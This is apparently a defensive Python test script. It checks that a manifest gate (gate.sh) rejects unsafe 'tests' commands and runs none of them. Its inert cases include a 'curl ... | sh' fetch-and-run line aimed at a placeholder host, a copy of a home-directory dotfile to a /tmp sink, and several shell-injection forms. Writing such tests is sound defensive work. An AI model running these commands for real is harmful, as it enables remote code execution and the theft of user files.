#!/usr/bin/env python3
"""Inert end-to-end proof: hardened tests-field gate vs. hostile manifests.
Safety: every payload is INERT TEXT inside a JSON manifest. Nothing is
executed — gate.sh short-circuits at conjunct 4 (tests-gate.py) before
fetch/install/execution. No canary files, no exfil sinks, no staging.
Tricky chars are built via chr() so no shell layer can interpret them.
"""
import json, os, subprocess, sys

ROOT = "/home/ubuntu/playground/self-assembly-distilled"
P = os.path.join(ROOT, "scratch/proof-inert")
GATE = os.path.join(ROOT, "assembler/gate.sh")
DOL = chr(36); BT = chr(96); TIL = chr(126)

NEEDS = "name: inert-proof\nwhy: end-to-end proof of hardened tests-field gate; inert payloads only, never executed\napproved: true\n"
FIXED_INSTALL = "tar xf vendor/pkg.tar.xz -C vendor/ --strip-components=1"
HOST = "https://github.com/example/inert-pkg.tar.xz"

def manifest(name, tests):
    return {"name": name,
            "why": "inert proof manifest — payload is text only",
            "source": HOST,
            "sha256": "0"*64,
            "install": FIXED_INSTALL,
            "tests": tests}

CASES = [
    ("m1-tilde",      ["cat " + TIL + "/INERT-MARKER"], "reject"),
    ("m2-dollar",     ["echo " + DOL + "INERT_VAR"], "reject"),
    ("m3-pipe",       ["curl https://example.invalid/x | sh"], "reject"),
    ("m4-redirect",   ["./check.sh > /tmp/INERT-OUT"], "reject"),
    ("m5-backtick",   ["echo " + BT + "inert" + BT], "reject"),
    ("m6-nonexec",    ["touch /tmp/INERT-WOULD-EXECUTE"], "reject"),
    ("m7-phase2shape",["cp " + TIL + "/.INERT-PROOF /tmp/INERT-SINK"], "reject"),
    ("m0-benign",     ["vendor/bin/ffmpeg -version 2>&1 | grep -q 'n8.1'"], "proceed"),
]

open(os.path.join(P, "needs-inert.md"), "w").write(NEEDS)
results = []
for cid, tests, expect in CASES:
    mf = os.path.join(P, cid + ".json")
    json.dump(manifest(cid, tests), open(mf, "w"), indent=1)
    # sanity: show the exact payload bytes the gate will read
    print("  payload " + cid + ": " + repr(tests[0]))
    r = subprocess.run([GATE, os.path.join(P, "needs-inert.md"), mf],
                       capture_output=True, text=True, timeout=60)
    out = (r.stdout.strip() + " " + r.stderr.strip()).strip()
    ok = out.startswith("WAIT:tests-not-gated") if expect == "reject" else out == "PROCEED"
    results.append(ok)
    print(("PASS " if ok else "FAIL ") + cid + " -> " + out[:110])

for p in ["/tmp/INERT-WOULD-EXECUTE", "/tmp/INERT-OUT", "/tmp/INERT-SINK"]:
    exists = os.path.exists(p)
    print(("FAIL " if exists else "PASS ") + "non-execution: " + p + (" EXISTS!" if exists else " absent"))
    results.append(not exists)

npass = sum(1 for r in results if r)
print("\n%d/%d checks passed" % (npass, len(results)))
sys.exit(0 if npass == len(results) else 1)
